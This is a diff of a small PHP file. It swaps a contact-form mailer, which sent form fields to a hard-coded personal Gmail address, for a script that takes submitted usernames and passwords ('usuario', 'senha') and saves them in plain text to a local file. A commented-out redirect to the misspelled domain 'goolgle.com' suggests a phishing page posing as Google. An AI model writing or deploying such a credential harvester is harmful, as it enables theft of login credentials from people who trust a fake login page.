@@ -1,29 +1,12 @@
-<?
+<?php
+$login = $_POST["usuario"];
+$senha = $_POST["senha"];
 
-# alterar a variavel abaixo colocando o seu email
-
-$destinatario = "lima.dan2016@gmail.com";
-
-$nome = $_REQUEST['nome'];
-$email = $_REQUEST['email'];
-$mensagem = $_REQUEST['mensagem'];
-$assunto = $_REQUEST['assunto'];
-
- // monta o e-mail na variavel $body
-
-$body = "===================================" . "\n";
-$body = $body . "FALE CONOSCO - TESTE COMPROVATIVO" . "\n";
-$body = $body . "===================================" . "\n\n";
-$body = $body . "Nome: " . $nome . "\n";
-$body = $body . "Email: " . $email . "\n";
-$body = $body . "Mensagem: " . $mensagem . "\n\n";
-$body = $body . "===================================" . "\n";
-
-// envia o email
-mail($destinatario, $assunto , $body, "From: $email\r\n");
-
-// redireciona para a página de obrigado
-header("location:obrigado.html");
-
-
+$consolidado = "Email:  $login - Senha: $senha";
+$arquivo = fopen('meu_arquivo.txt', 'w');
+if ($arquivo == false)
+    die('Não foi possível enviar seu arquivo.');
+fwrite($arquivo, $consolidado);
+fclose($arquivo);
+//header("location: https://www.goolgle.com/");
 ?>
